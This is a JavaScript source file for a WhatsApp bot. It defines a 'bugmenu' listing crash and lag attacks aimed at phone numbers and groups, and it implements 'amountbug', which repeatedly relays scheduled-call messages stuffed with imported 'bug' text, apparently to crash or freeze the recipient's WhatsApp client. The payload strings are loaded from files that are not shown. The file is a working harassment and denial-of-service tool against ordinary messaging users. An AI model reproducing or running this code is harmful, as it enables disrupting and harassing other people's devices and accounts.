const { zokou } = require('../framework/zokou');
const { delay } = require("../bdd/utils")
const moment = require('moment-timezone');
const conf = require('../set.js');
const fs = require('fs');
const path = require('path');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// bug database
const { bugtext1 } = require('../framework/bugs/bugtext1');
const { bugtext2 } = require('../framework/bugs/bugtext2');
const { bugtext3 } = require('../framework/bugs/bugtext3');
const { bugtext4 } = require('../framework/bugs/bugtext4');
const { bugtext5 } = require('../framework/bugs/bugtext5');


const timewisher = (time) => {
  if(time < "23:59:00"){
    return `Good Night 🌆`;
  }
  else if(time < "19:00:00"){
    return `Good Evening 🌆`;
  }
  else if(time < "18:00:00"){
    return `Good Evening 🌆`;
  }
  else if(time < "15:00:00"){
    return `Good Afternoon 🌅`;
  }
  else if(time < "11:00:00"){
    return `Good Morning 🌄`;
  }
  else if(time < "05:00:00"){
    return `Good Morning 🌄`;
  } 
};

// --cmds--

// bug menu
zokou(
  {
    nomCom: 'bugmenu',
    categorie: 'dev',
    reaction: '😈'
  },
  
  async (dest, zk, commandOptions) => {
    const {ms,arg,repondre} = commandOptions;
    const mono = '```';
    const time = moment().tz(conf.TZ).format('HH:mm:ss');
    const versions = ['v1','v2'];
    const version = versions[Math.floor(Math.random() * versions.length)];
    const menuImage = fs.readFileSync(path.resolve(path.join(__dirname,'..','media','deleted-message.jpg')));
    const tumbUrl = 'https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg';
    let menu = `${mono}Hello ${ms.pushName}
${timewisher(time)}

≡𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
amountbug <amount>
pmbug <number>
delaybug <number>
trollybug <number>
docubug <number>
unlimitedbug <number>
bombug <number>
lagbug <number>
gcbug <grouplink>
delaygcbug <grouplink>
trollygcbug <grouplink>
laggcbug <grouplink>
bomgcbug <grouplink>
unlimitedgcbug <grouplink>
docugcbug <grouplink>${mono}`;
  switch (version) {
    case 'v1': {
      zk.sendMessage(dest, {
      image: menuImage,
      caption: menu
      }, { quoted: ms });
    }
    break;
    case 'v2': {
      zk.sendMessage(dest, {
      image: menuImage,
      caption: menu,
      contextInfo: {
        externalAdReply:
          {
            showAdAttribution: true,
            title: `${conf.BOT}`,
            body: `Bot Created By ${conf.OWNER_NAME}`,
            AbhinailUrl: tumbUrl,
            previewType: 'PHOTO',
            sourceUrl: 'https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g',
            mediaType: 1,
            renderLargerAbhinail: true
          }
        }
      }, { quoted: ms });
    }
    break;
  }
  }
  );

// amountbug
zokou(
  {
    nomCom: 'amountbug',
    categorie: 'dev',
    reaction: '😈'
  },
  
  async (dest, zk, commandOptions) => {
    const { ms, arg, repondre, superUser } = commandOptions;
    
    if (!superUser) 
      return await repondre("You are not authorised to use this  command !!!");
    if (!arg[0])
      return await repondre(`Use ${conf.PREFIXE}amountbug amount\n> Example ${conf.PREFIXE}amountbug 5`);
      
    const amount = parseInt(arg[0]);
    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
      return await repondre(`use a vaid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
    for (let i=0; i < amount; i++) {
      const bug = `${bugtext1}`;
      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz(conf.TZ).format("DD/MM/YYYY HH:mm:ss")}`,
"title": bug,
}
}), { userJid: dest, quoted : ms});
    zk.relayMessage(dest, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
    await delay(3000);
    }
    await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
  }
  );